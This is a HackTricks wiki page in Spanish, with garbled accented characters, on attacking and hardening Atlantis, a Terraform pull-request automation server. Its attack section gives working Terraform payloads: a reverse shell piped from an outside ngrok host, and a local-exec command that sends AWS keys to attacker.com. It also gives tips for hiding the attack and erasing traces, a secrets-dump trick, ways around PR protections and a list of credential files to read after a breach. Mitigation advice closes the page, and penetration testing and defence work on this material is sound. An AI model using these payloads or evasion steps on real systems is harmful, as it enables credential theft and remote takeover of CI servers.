# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

Atlantis b치sicamente te ayuda a ejecutar terraform desde Pull Requests de tu servidor git.

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. Ve a la **p치gina de lanzamientos de atlantis** en [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) y **descarga** la que m치s te convenga.
2. Crea un **token personal** (con acceso a repos) de tu usuario de **github**.
3. Ejecuta `./atlantis testdrive` y se crear치 un **repositorio de demostraci칩n** que puedes usar para **hablar con atlantis**.
1. Puedes acceder a la p치gina web en 127.0.0.1:4141.

### Atlantis Access

#### Git Server Credentials

**Atlantis** soporta varios hosts git como **Github**, **Gitlab**, **Bitbucket** y **Azure DevOps**.\
Sin embargo, para acceder a los repos en esas plataformas y realizar acciones, necesita tener alg칰n **acceso privilegiado concedido a ellos** (al menos permisos de escritura).\
[**Los docs**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) recomiendan crear un usuario en estas plataformas espec칤ficamente para Atlantis, pero algunas personas pueden usar cuentas personales.

{% hint style="warning" %}
En cualquier caso, desde la perspectiva de un atacante, la **cuenta de Atlantis** va a ser muy **interesante** **de comprometer**.
{% endhint %}

#### Webhooks

Atlantis utiliza opcionalmente [**Webhook secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que los **webhooks** que recibe de tu host Git son **leg칤timos**.

Una forma de confirmar esto ser칤a **permitir que las solicitudes solo provengan de las IPs** de tu host Git, pero una forma m치s f치cil es usar un Webhook Secret.

Ten en cuenta que a menos que uses un servidor privado de github o bitbucket, necesitar치s exponer los endpoints de webhook a Internet.

{% hint style="warning" %}
Atlantis va a estar **exponiendo webhooks** para que el servidor git pueda enviarle informaci칩n. Desde la perspectiva de un atacante, ser칤a interesante saber **si puedes enviarle mensajes**.
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[De los docs:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis ejecuta Terraform simplemente **ejecutando los comandos `terraform plan` y `apply`** en el servidor **donde est치 alojado Atlantis**. Al igual que cuando ejecutas Terraform localmente, Atlantis necesita credenciales para tu proveedor espec칤fico.

Depende de ti c칩mo [proporcionar credenciales](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para tu proveedor espec칤fico a Atlantis:

* El [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) de Atlantis y el [M칩dulo AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) tienen sus propios mecanismos para credenciales de proveedor. Lee sus docs.
* Si est치s ejecutando Atlantis en la nube, muchas nubes tienen formas de dar acceso a la API de la nube a las aplicaciones que se ejecutan en ellas, por ejemplo:
* [Roles de AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Busca "EC2 Role").
* [Cuentas de Servicio de Instancia de GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference).
* Muchos usuarios establecen variables de entorno, por ejemplo, `AWS_ACCESS_KEY`, donde se est치 ejecutando Atlantis.
* Otros crean los archivos de configuraci칩n necesarios, por ejemplo, `~/.aws/credentials`, donde se est치 ejecutando Atlantis.
* Usa el [Proveedor HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obtener credenciales de proveedor.

{% hint style="warning" %}
El **contenedor** donde **Atlantis** est치 **ejecut치ndose** probablemente **contendr치 credenciales privilegiadas** para los proveedores (AWS, GCP, Github...) que Atlantis est치 gestionando a trav칠s de Terraform.
{% endhint %}

#### Web Page

Por defecto, Atlantis ejecutar치 una **p치gina web en el puerto 4141 en localhost**. Esta p치gina solo te permite habilitar/deshabilitar atlantis apply y verificar el estado del plan de los repos y desbloquearlos (no permite modificar cosas, por lo que no es tan 칰til).

Probablemente no la encuentres expuesta a Internet, pero parece que por defecto **no se necesitan credenciales** para acceder a ella (y si las hay, `atlantis`:`atlantis` son las **predeterminadas**).

### Server Configuration

La configuraci칩n para `atlantis server` puede especificarse a trav칠s de flags de l칤nea de comandos, variables de entorno, un archivo de configuraci칩n o una mezcla de los tres.

* Puedes encontrar [**aqu칤 la lista de flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) soportados por el servidor de Atlantis.
* Puedes encontrar [**aqu칤 c칩mo transformar una opci칩n de configuraci칩n en una variable de entorno**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables).

Los valores se **eligen en este orden**:

1. Flags
2. Variables de Entorno
3. Archivo de Configuraci칩n

{% hint style="warning" %}
Ten en cuenta que en la configuraci칩n podr칤as encontrar valores interesantes como **tokens y contrase침as**.
{% endhint %}

#### Repos Configuration

Algunas configuraciones afectan **c칩mo se gestionan los repos**. Sin embargo, es posible que **cada repo requiera configuraciones diferentes**, por lo que hay formas de especificar cada repo. Este es el orden de prioridad:

1. Archivo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Este archivo se puede usar para especificar c칩mo atlantis deber칤a tratar el repo. Sin embargo, por defecto, algunas claves no se pueden especificar aqu칤 sin algunos flags que lo permitan.
1. Probablemente requerido ser permitido por flags como `allowed_overrides` o `allow_custom_workflows`.
2. [**Configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Puedes pasarla con el flag `--repo-config` y es un yaml que configura nuevos ajustes para cada repo (regexes soportados).
3. Valores **predeterminados**.

**PR Protections**

Atlantis permite indicar si deseas que el **PR** sea **`aprobado`** por alguien m치s (incluso si eso no est치 configurado en la protecci칩n de la rama) y/o ser **`fusionable`** (protecciones de rama aprobadas) **antes de ejecutar apply**. Desde un punto de vista de seguridad, establecer ambas opciones es recomendable.

En caso de que `allowed_overrides` sea True, estas configuraciones pueden ser **sobrescritas en cada proyecto por el archivo `/atlantis.yml`**.

**Scripts**

La configuraci칩n del repo puede **especificar scripts** para ejecutar [**antes**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_ganchos de pre flujo de trabajo_) y [**despu칠s**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_ganchos de post flujo de trabajo_) de que se ejecute un **flujo de trabajo**.

No hay ninguna opci칩n para permitir **especificar** estos scripts en el **archivo `/atlantis.yml`** del repo.

**Workflow**

En la configuraci칩n del repo (configuraci칩n del lado del servidor) puedes [**especificar un nuevo flujo de trabajo predeterminado**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), o [**crear nuevos flujos de trabajo personalizados**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Tambi칠n puedes **especificar** qu칠 **repos** pueden **acceder** a los **nuevos** generados.\
Luego, puedes permitir que el archivo **atlantis.yaml** de cada repo **especifique el flujo de trabajo a usar**.

{% hint style="danger" %}
Si el flag de [**configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est치 configurado como **True**, los flujos de trabajo pueden ser **especificados** en el archivo **`atlantis.yaml`** de cada repo. Tambi칠n es potencialmente necesario que **`allowed_overrides`** especifique tambi칠n **`workflow`** para **sobrescribir el flujo de trabajo** que se va a utilizar.\
Esto b치sicamente dar치 **RCE en el servidor de Atlantis a cualquier usuario que pueda acceder a ese repo**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Verificaci칩n de Pol칤ticas de Conftest**

Atlantis admite la ejecuci칩n de **pol칤ticas** de [**conftest**](https://www.conftest.dev/) **del lado del servidor** contra la salida del plan. Los casos de uso comunes para utilizar este paso incluyen:

* Negar el uso de una lista de m칩dulos
* Afirmar atributos de un recurso en el momento de la creaci칩n
* Capturar eliminaciones no intencionadas de recursos
* Prevenir riesgos de seguridad (es decir, exponer puertos seguros al p칰blico)

Puedes consultar c칩mo configurarlo en [**la documentaci칩n**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Comandos de Atlantis

[**En la documentaci칩n**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) puedes encontrar las opciones que puedes usar para ejecutar Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Ataques

{% hint style="warning" %}
Si durante la explotaci칩n encuentras este **error**: `Error: Error acquiring the state lock`

Puedes solucionarlo ejecutando:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Modificaci칩n de configuraci칩n en una nueva PR

Si tienes acceso de escritura sobre un repositorio, podr치s crear una nueva rama en 칠l y generar una PR. Si puedes **ejecutar `atlantis plan`** (o tal vez se ejecute autom치ticamente) **podr치s RCE dentro del servidor de Atlantis**.

Puedes hacer esto haciendo que [**Atlantis cargue una fuente de datos externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source). Simplemente coloca un payload como el siguiente en el archivo `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Ataque m치s sigiloso**

Puedes realizar este ataque incluso de una **manera m치s sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el rev shell directamente en el archivo de terraform, puedes **cargar un recurso externo** que contenga el rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puedes encontrar el c칩digo de rev shell en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* En el recurso externo, utiliza la caracter칤stica **ref** para ocultar el **c칩digo de rev shell de terraform en una rama** dentro del repositorio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **En lugar de** crear un **PR a master** para activar Atlantis, **crea 2 ramas** (test1 y test2) y crea un **PR de una a la otra**. Cuando hayas completado el ataque, simplemente **elimina el PR y las ramas**.

#### Atlantis plan Secrets Dump

Puedes **volcar secretos utilizados por terraform** ejecutando `atlantis plan` (`terraform plan`) poniendo algo como esto en el archivo de terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Modificaci칩n de configuraci칩n en nueva PR

Si tienes acceso de escritura sobre un repositorio, podr치s crear una nueva rama en 칠l y generar una PR. Si puedes **ejecutar `atlantis apply`, podr치s RCE dentro del servidor de Atlantis**.

Sin embargo, generalmente necesitar치s eludir algunas protecciones:

* **Mergeable**: Si esta protecci칩n est치 configurada en Atlantis, solo podr치s ejecutar **`atlantis apply` si la PR es mergeable** (lo que significa que la protecci칩n de rama debe ser eludida).
* Verifica posibles [**elusiones de protecciones de rama**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Approved**: Si esta protecci칩n est치 configurada en Atlantis, **otro usuario debe aprobar la PR** antes de que puedas ejecutar `atlantis apply`
* Por defecto, puedes abusar del [**token de Gitbot para eludir esta protecci칩n**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Ejecutando **`terraform apply` en un archivo de Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo necesitas asegurarte de que alguna carga 칰til como las siguientes termine en el archivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sigue las **sugerencias de la t칠cnica anterior** para realizar este ataque de una manera **m치s sigilosa**.

#### Inyecci칩n de Par치metros de Terraform

Al ejecutar `atlantis plan` o `atlantis apply`, terraform se est치 ejecutando por debajo, puedes pasar comandos a terraform desde atlantis comentando algo como:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Algo que puedes pasar son variables de entorno que pueden ser 칰tiles para eludir algunas protecciones. Consulta las variables de entorno de terraform en [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Flujo de trabajo personalizado

Ejecutando **comandos de construcci칩n personalizados maliciosos** especificados en un archivo `atlantis.yaml`. Atlantis utiliza el archivo `atlantis.yaml` de la rama de la solicitud de extracci칩n, **no** de `master`.\
Esta posibilidad se mencion칩 en una secci칩n anterior:

{% hint style="danger" %}
Si la bandera de [**configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est치 configurada en **True**, los flujos de trabajo pueden ser **especificados** en el archivo **`atlantis.yaml`** de cada repositorio. Tambi칠n es potencialmente necesario que **`allowed_overrides`** especifique tambi칠n **`workflow`** para **sobrescribir el flujo de trabajo** que se va a utilizar.

Esto b치sicamente dar치 **RCE en el servidor de Atlantis a cualquier usuario que pueda acceder a ese repositorio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Bypass plan/apply protections

Si la bandera [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiene_ `apply_requirements` configurado, es posible que un repositorio **modifique las protecciones de plan/apply para eludirlas**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Si alguien env칤a **`atlantis plan/apply` comentarios en tus pull requests v치lidos,** har치 que terraform se ejecute cuando no lo desees.

Adem치s, si no tienes configurado en la **protecci칩n de ramas** para pedir **reevaluar** cada PR cuando se **empuja un nuevo commit** a ella, alguien podr칤a **escribir configuraciones maliciosas** (ver escenarios anteriores) en la configuraci칩n de terraform, ejecutar `atlantis plan/apply` y obtener RCE.

Esta es la **configuraci칩n** en las protecciones de ramas de Github:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Si logras **robar el webhook secret** utilizado o si **no hay ning칰n webhook secret** en uso, podr칤as **llamar al webhook de Atlantis** e **invocar comandos de atlantis** directamente.

#### Bitbucket

Bitbucket Cloud **no soporta webhook secrets**. Esto podr칤a permitir a los atacantes **falsificar solicitudes desde Bitbucket**. Aseg칰rate de permitir solo IPs de Bitbucket.

* Esto significa que un **atacante** podr칤a hacer **solicitudes falsas a Atlantis** que parecen provenir de Bitbucket.
* Si est치s especificando `--repo-allowlist`, entonces solo podr칤an falsificar solicitudes relacionadas con esos repos, por lo que el mayor da침o que podr칤an hacer ser칤a planificar/aplicar en tus propios repos.
* Para prevenir esto, permite [las direcciones IP de Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (ver direcciones IPv4 salientes).

### Post-Exploitation

Si lograste acceder al servidor o al menos obtuviste un LFI, hay algunas cosas interesantes que deber칤as intentar leer:

* `/home/atlantis/.git-credentials` Contiene credenciales de acceso a vcs
* `/atlantis-data/atlantis.db` Contiene credenciales de acceso a vcs con m치s informaci칩n
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Archivo de estado de Terraform
* Ejemplo: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Variables de entorno
* `/proc/[2-20]/cmdline` L칤nea de comandos de `atlantis server` (puede contener datos sensibles)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Debido a que cualquiera puede comentar en pull requests p칰blicos, incluso con todas las mitigaciones de seguridad disponibles, sigue siendo peligroso ejecutar Atlantis en repos p칰blicos sin la configuraci칩n adecuada de los ajustes de seguridad.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si est치s ejecutando en un repositorio p칰blico (lo cual no se recomienda, ver arriba), no deber칤as establecer `--allow-fork-prs` (por defecto es falso) porque cualquiera puede abrir un pull request desde su fork a tu repositorio.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis requiere que especifiques una lista permitida de repositorios de los que aceptar치 webhooks a trav칠s de la bandera `--repo-allowlist`. Por ejemplo:

* Repositorios espec칤ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Tu organizaci칩n completa: `--repo-allowlist=github.com/runatlantis/*`
* Cada repositorio en tu instalaci칩n de GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Todos los repositorios: `--repo-allowlist=*`. 칔til cuando est치s en una red protegida pero peligroso sin tambi칠n establecer un webhook secret.

Esta bandera asegura que tu instalaci칩n de Atlantis no se est칠 utilizando con repositorios que no controlas. Consulta `atlantis server --help` para m치s detalles.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si los atacantes env칤an pull requests con c칩digo malicioso de Terraform en tu modelo de amenaza, entonces debes ser consciente de que las aprobaciones de `terraform apply` no son suficientes. Es posible ejecutar c칩digo malicioso en un `terraform plan` utilizando la [fuente de datos `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) o especificando un proveedor malicioso. Este c칩digo podr칤a luego exfiltrar tus credenciales.

Para prevenir esto, podr칤as:

1. Incluir proveedores en la imagen de Atlantis o alojar y negar la salida en producci칩n.
2. Implementar el protocolo de registro de proveedores internamente y negar la salida p칰blica, de esa manera controlas qui칠n tiene acceso de escritura al registro.
3. Modificar el paso `plan` de tu [configuraci칩n de repositorio del lado del servidor](https://www.runatlantis.io/docs/server-side-repo-config.html) para validar contra el uso de proveedores o fuentes de datos no permitidos o PRs de usuarios no autorizados. Tambi칠n podr칤as agregar validaci칩n adicional en este punto, por ejemplo, requiriendo un "me gusta" en el PR antes de permitir que el `plan` contin칰e. Conftest podr칤a ser 칰til aqu칤.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis debe ejecutarse con los secretos de Webhook establecidos a trav칠s de las variables de entorno `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Incluso con la bandera `--repo-allowlist` establecida, sin un webhook secret, los atacantes podr칤an hacer solicitudes a Atlantis haci칠ndose pasar por un repositorio que est치 en la lista permitida. Los secretos de Webhook aseguran que las solicitudes de webhook provengan realmente de tu proveedor de VCS (GitHub o GitLab).

Si est치s utilizando Azure DevOps, en lugar de secretos de webhook, agrega un nombre de usuario y una contrase침a b치sicos.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps admite el env칤o de un encabezado de autenticaci칩n b치sica en todos los eventos de webhook. Esto requiere usar una URL HTTPS para tu ubicaci칩n de webhook.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si est치s utilizando secretos de webhook pero tu tr치fico es a trav칠s de HTTP, entonces los secretos de webhook podr칤an ser robados. Habilita SSL/HTTPS utilizando las banderas `--ssl-cert-file` y `--ssl-key-file`.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Se recomienda encarecidamente habilitar la autenticaci칩n en el servicio web. Habilita BasicAuth utilizando `--web-basic-auth=true` y configura un nombre de usuario y una contrase침a utilizando las banderas `--web-username=yourUsername` y `--web-password=yourPassword`.

Tambi칠n puedes pasar estos como variables de entorno `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` y `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
